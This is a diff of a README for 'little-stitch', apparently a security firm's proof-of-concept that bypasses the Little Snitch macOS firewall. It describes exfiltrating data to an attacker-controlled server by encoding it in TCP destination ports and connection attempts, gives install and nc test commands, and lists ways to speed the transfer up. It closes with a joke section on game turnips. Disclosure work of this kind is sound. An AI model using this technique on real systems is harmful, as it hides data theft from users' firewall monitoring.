@@ -12,7 +12,7 @@ https://user-images.githubusercontent.com/4079939/146304055-ddcbd09f-0379-4c49-a
 ```
 tag=$(curl -s https://api.github.com/repos/RhinoSecurityLabs/little-stitch/releases/latest|jq -r '.tag_name'|tr -d 'v')
 curl -L "https://github.com/RhinoSecurityLabs/little-stitch/releases/download/v${tag}/little-stitch_${tag}_$(uname -s)_$(uname -m).tar.gz" \
-    | tar -xvf - -C /usr/local/bin/ little-stitch
+    | tar -xzf - -C /usr/local/bin/ little-stitch
 ```
 
 ### Build
@@ -42,17 +42,16 @@ You'll want to start the server before the client, you may get unexpected result
 echo 'hello from client' | ./little-stitch client <server ip address>
 ```
 
-## Underlying Issue
+## Bypassing Little Snitch Firewall with Empty TCP Packets
 
-Little Snitch does not actually trigger an alert when a TCP connection is established but instead is triggered
+Little Snitch does not trigger an alert when a TCP connection is established but instead is triggered
 when application data is sent across the connection. So if you set up a TCP connection and immediately close it,
 before sending any data across it, an alert will not be triggered by Little Snitch.
 
 You can test this without installing anything on your computer with the nc command.
 
-Note: For unknown reasons Little Snitch alerting seems to be inconsistant when netcat is used like this. If you
-are getting alerts with the following commands you may have more success with the PoC, which is more
-reliable.
+Note: For unknown reasons, Little Snitch alerting seems to be inconsistent when netcat is used like this. If you
+are getting alerts with the following commands you may have more success with the PoC, which is more reliable.
 
 ```
 % nc -G 2 -vz 1.1.1.1 80
@@ -67,8 +66,8 @@ communications between a server and a client running behind Little Snitch withou
 ## Implementation Details
 
 For exfiling data to an attacker-controlled server, instead of sending data across the TCP connection as
-application data we want to encode our data, into attributes of the connection which are settable by an
-underprivileged user client-side, and will be readable on the same connection server-side.
+application data, we want to encode our data as attributes of the TCP/IP connection. These attributes should
+be modifiable by an underprivileged user, and be readable by the server without affecting routing.
 
 There are several attributes of a TCP connection that fill these requirements, however the most
 straightforward is the destination port number, and whether a connection is opened or not. If we
@@ -122,14 +121,24 @@ the server and the client need to be more careful about remaining in sync during
 
 ## Transfer Speed
 
-The transfer speed in this PoC is not terribly fast, based on observations it appears to be able to upload at about a 16 bit/s
-and download at about 8 bit/s. It's worth pointing out that this PoC has not been optimized at all and is just running the
-simplest thing that will work, it should be possible to increase this number by many fold. Some optimizations that might help
-here is using the source port to encode data in addition to the destination port, parallelizing some off the transfer would
-likely help quite a bit as well. Currently the majority of time is spent waiting on TCP connections to close, because everything
-is run serialized this ends up slowing things down quite a bit. There's also likely other attributes of the connection that could
-be used to store data, the urgent bit as an example (I suspect several others I'm not thinking of as well). So this is slow right
-now, but I wouldn't rely on that.
+This unoptimized proof of concept is very low bandwidth, based on observations it appears to be able to upload at about 16 bit/s
+and download at about 8 bit/s. Currently, the majority of time is spent waiting on TCP connections to close and because everything is run
+serialized this ends up slowing things down quite a bit. Listed below are a few possible optimizations along with the estimated
+speed up (these are very rough, and may not even work as expected, so take this with a grain of salt).
+
+* Encoding data in the source port.
+  * Estimated speed up: 2x
+* Use NFQUEUE on the server to read Syn packets sent by the client without opening a full TCP connection.
+  * Estimated speed up: 5x, maybe more, at the cost of reliable transfers. This is because each connection needs to
+    go through the full TCP handshake and teardown process. This results in 5 packets per connection (SYN, SYN/ACK, ACK, client
+    FIN/ACK, server FIN/ACK).
+* Parallelizing data transfer and compression.
+  * Estimated speed up: ?
+* Use TCP OOB flag for data.
+  * Estimated speed up: 1 bit per connection.
+* Use TCP Urgent flag for data.
+  * Estimated speed up: 1 bit per connection.
+
 
 ## What's with the Little Stitch name?
 
@@ -137,15 +146,15 @@ Snitch sounds like stitch, and little-stitch reminds me of Stitch Face, which is
 you seem to be so interested in Peach's turnips now, the rest of this README is about them.
 
 Peaches turnips come in many variations and typically do 2%-10% damage when thrown. The Stitch Face Turnip is unique however, it is one of the
-two rarest turnips in the game with only a 1.711% chance of appearing with each pull. What puts it appart from the other turnips isn't it's
-rarety however, it's the punch it packs at 34% damage, making it the most powerfull item that is legal in turnament play.
+two rarest turnips in the game with only a 1.711% chance of appearing with each pull. What puts it apart from the other turnips isn't its
+rarety however, it's the punch it packs at 34% damage, making it the most powerful item that is legal in tournament play.
 
-Turnip Tip: after you throw it and it hit's your opponant try recatching it by jumping and pressing Z when the turnip bounces back and passess
+Turnip Tip: after you throw it and it hits your opponent try recatching it by jumping and pressing Z when the turnip bounces back and passes
 through peaches body onscreen.
 
 ### Turnip Stats
 
-| Turnip Name | Damage      | Propability |
+| Turnip Name | Damage      | Probability |
 | ----------- | ----------- |-------------|
 | Normal      | 6 %         | 59.873 %    |
 | Eybrow Eyes | 6 %         | 10.264 %    |
